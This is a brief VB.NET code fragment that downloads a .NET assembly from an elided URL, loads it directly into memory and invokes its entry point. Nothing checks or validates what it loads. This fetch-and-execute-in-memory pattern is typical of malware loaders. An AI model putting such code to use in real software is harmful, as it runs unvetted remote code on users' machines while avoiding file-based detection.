        Try
            Dim myWebClient As New WebClient()
            Dim a As System.Reflection.Assembly = System.Reflection.Assembly.Load(myWebClient.DownloadData("http://..."))
            Dim method As System.Reflection.MethodInfo = a.EntryPoint
            Dim o As Object = a.CreateInstance(method.Name)
            method.Invoke(o, New Object() {New String() {"1"}})
        Catch ex As Exception
            MsgBox(ex.Message.ToString)
        End Try
